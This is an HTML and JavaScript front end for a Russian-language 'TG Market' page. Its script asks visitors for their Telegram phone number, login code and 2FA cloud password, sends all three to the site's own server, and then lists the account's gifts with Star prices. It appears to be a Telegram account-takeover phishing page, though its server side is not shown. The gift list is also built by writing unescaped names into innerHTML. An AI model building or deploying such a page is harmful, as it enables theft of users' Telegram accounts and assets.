<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TG Market — Вход</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .card {
            background: #1a1a2e;
            border-radius: 16px;
            padding: 32px 28px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo h1 {
            font-size: 24px;
            color: #00aaff;
            letter-spacing: 1px;
        }

        .logo p {
            font-size: 13px;
            color: #888;
            margin-top: 6px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin-bottom: 6px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 14px;
            background: #16213e;
            border: 1px solid #2a2a4a;
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #00aaff;
        }

        .btn {
            width: 100%;
            padding: 13px;
            background: linear-gradient(135deg, #0088cc, #00aaff);
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 8px;
        }

        .btn:hover { opacity: 0.9; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }

        .error {
            background: #2d1525;
            color: #ff6b6b;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 14px;
            display: none;
        }

        .step { display: none; }
        .step.active { display: block; }

        .gifts-list {
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }

        .gift-item {
            background: #16213e;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .gift-name {
            font-size: 14px;
            color: #ddd;
        }

        .gift-price {
            font-size: 14px;
            color: #00aaff;
            font-weight: 600;
        }

        .success-header {
            text-align: center;
            margin-bottom: 16px;
        }

        .success-header h2 {
            color: #4caf50;
            font-size: 18px;
        }

        .success-header p {
            color: #888;
            font-size: 13px;
            margin-top: 4px;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <h1>TG Market</h1>
                <p>Войдите через Telegram</p>
            </div>

            <div id="error" class="error"></div>

            <!-- Step 1: Phone -->
            <div id="step-phone" class="step active">
                <div class="form-group">
                    <label>Номер телефона</label>
                    <input type="tel" id="phone" placeholder="+7 999 123 45 67" autofocus>
                </div>
                <button class="btn" id="btn-phone" onclick="sendCode()">Получить код</button>
            </div>

            <!-- Step 2: Code -->
            <div id="step-code" class="step">
                <div class="form-group">
                    <label>Код из Telegram</label>
                    <input type="text" id="code" placeholder="12345" inputmode="numeric" maxlength="6">
                </div>
                <div class="form-group" id="group-2fa" style="display:none">
                    <label>Пароль 2FA</label>
                    <input type="password" id="password" placeholder="Облачный пароль">
                </div>
                <button class="btn" id="btn-code" onclick="verifyCode()">Войти</button>
            </div>

            <!-- Step 3: Result -->
            <div id="step-result" class="step">
                <div class="success-header">
                    <h2>Готово!</h2>
                    <p id="user-label"></p>
                </div>
                <div class="gifts-list" id="gifts-list"></div>
            </div>
        </div>
    </div>

    <script>
        let currentSid = null;

        function showError(msg) {
            const el = document.getElementById('error');
            el.textContent = msg;
            el.style.display = msg ? 'block' : 'none';
        }

        function showStep(name) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step-' + name).classList.add('active');
        }

        function setLoading(btnId, loading) {
            const btn = document.getElementById(btnId);
            btn.disabled = loading;
            if (loading) {
                btn.dataset.text = btn.textContent;
                btn.innerHTML = '<span class="spinner"></span>Подождите...';
            } else {
                btn.textContent = btn.dataset.text || btn.textContent;
            }
        }

        async function sendCode() {
            showError('');
            const phone = document.getElementById('phone').value.trim();
            if (!phone) { showError('Введите номер телефона'); return; }

            setLoading('btn-phone', true);
            try {
                const res = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone }),
                });
                const data = await res.json();
                if (!data.ok) { showError(data.error); return; }
                currentSid = data.sid;
                showStep('code');
                document.getElementById('code').focus();
            } catch (e) {
                showError('Ошибка сети');
            } finally {
                setLoading('btn-phone', false);
            }
        }

        async function verifyCode() {
            showError('');
            const code = document.getElementById('code').value.trim();
            const password = document.getElementById('password').value.trim();
            if (!code) { showError('Введите код'); return; }

            setLoading('btn-code', true);
            try {
                const res = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sid: currentSid, code, password }),
                });
                const data = await res.json();
                if (!data.ok) { showError(data.error); return; }

                if (data.needs_2fa) {
                    document.getElementById('group-2fa').style.display = 'block';
                    document.getElementById('password').focus();
                    setLoading('btn-code', false);
                    return;
                }

                // Show results
                document.getElementById('user-label').textContent = data.user;
                const list = document.getElementById('gifts-list');
                list.innerHTML = '';
                (data.gifts || []).forEach(g => {
                    const name = g.name || g.id || '—';
                    const price = g.price != null ? g.price + ' ⭐' : '—';
                    list.innerHTML += `
                        <div class="gift-item">
                            <span class="gift-name">${name}</span>
                            <span class="gift-price">${price}</span>
                        </div>`;
                });
                showStep('result');
            } catch (e) {
                showError('Ошибка сети');
            } finally {
                setLoading('btn-code', false);
            }
        }

        // Enter key support
        document.getElementById('phone').addEventListener('keydown', e => {
            if (e.key === 'Enter') sendCode();
        });
        document.getElementById('code').addEventListener('keydown', e => {
            if (e.key === 'Enter') verifyCode();
        });
        document.getElementById('password').addEventListener('keydown', e => {
            if (e.key === 'Enter') verifyCode();
        });
    </script>
</body>
</html>
